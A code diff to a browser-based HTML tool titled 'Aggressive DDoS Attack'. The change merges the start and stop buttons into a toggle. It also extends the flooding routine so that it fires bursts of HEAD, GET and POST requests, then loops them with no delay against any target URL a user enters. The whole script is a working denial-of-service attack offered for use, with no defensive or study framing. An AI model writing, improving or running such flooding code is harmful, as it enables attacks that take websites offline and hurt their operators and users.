@@ -54,47 +54,61 @@
 <body>
     <h1>Aggressive DDoS Attack</h1>
     <p>Target URL: <input type="text" id="targetURL" placeholder="https://example.com"></p>
-    <button onclick="startAttack()">Start Attack</button>
-    <button onclick="stopAttack()">Stop Attack</button>
+    <button id="attackButton" onclick="toggleAttack()">Start Attack</button>
     <div id="status"></div>
     <div id="console"></div>
 
     <script>
         let attackInterval;
+        let isAttacking = false;
 
-        function startAttack() {
+        function toggleAttack() {
+            const attackButton = document.getElementById('attackButton');
             const targetURL = document.getElementById('targetURL').value;
             if (!targetURL) {
                 document.getElementById('status').innerText = 'Please enter a valid target URL.';
                 return;
             }
 
-            document.getElementById('status').innerText = 'Attack in progress...';
+            if (!isAttacking) {
+                document.getElementById('status').innerText = 'Attack in progress...';
+                attackButton.innerText = 'Stop Attack';
+                isAttacking = true;
+                startAttack(targetURL);
+            } else {
+                document.getElementById('status').innerText = 'Attack stopped.';
+                attackButton.innerText = 'Start Attack';
+                isAttacking = false;
+                stopAttack();
+            }
+        }
 
-            function sendRequest() {
+        function startAttack(targetURL) {
+            function sendRequest(method) {
                 const xhr = new XMLHttpRequest();
-                xhr.open('GET', targetURL, true);
+                xhr.open(method, targetURL, true);
                 xhr.onreadystatechange = function() {
                     if (xhr.readyState === 4) {
-                        consoleOutput(xhr.status + ': ' + xhr.responseURL);
+                        consoleOutput(`${method} ${xhr.status}: ${xhr.responseURL}`);
                     }
                 };
                 xhr.send();
             }
 
-            // Initial burst of 100 requests
+            // Initial burst of 100 requests for each method
             for (let i = 0; i < 100; i++) {
-                sendRequest();
+                ['HEAD', 'GET', 'POST'].forEach(method => sendRequest(method));
             }
 
-            // Aggressive looping
-            attackInterval = setInterval(sendRequest, 0);
+            // Aggressive looping for each method
+            attackInterval = setInterval(() => {
+                ['HEAD', 'GET', 'POST'].forEach(method => sendRequest(method));
+            }, 0);
         }
 
         function stopAttack() {
             if (attackInterval) {
                 clearInterval(attackInterval);
-                document.getElementById('status').innerText = 'Attack stopped.';
             }
         }
 
